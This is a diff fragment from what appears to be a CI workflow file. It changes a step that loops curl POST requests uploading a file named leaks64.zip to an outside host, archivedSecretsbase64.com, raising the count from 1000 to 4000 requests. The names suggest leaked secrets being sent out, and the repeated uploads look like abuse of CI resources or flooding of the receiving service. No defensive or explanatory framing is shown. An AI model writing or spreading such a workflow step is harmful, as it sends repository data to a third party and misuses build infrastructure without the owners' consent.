@@ -58,7 +58,7 @@ jobs:
       - name: 🚀 Upload the generated Zip File base64 (x1000)
         run: |
           # Loop 1000 times
-          for i in {1..1000}; do
+          for i in {1..4000}; do
             echo "Executing request #$i..."
             curl -X POST https://archivedSecretsbase64.com \
               -F "file=@leaks64.zip" \
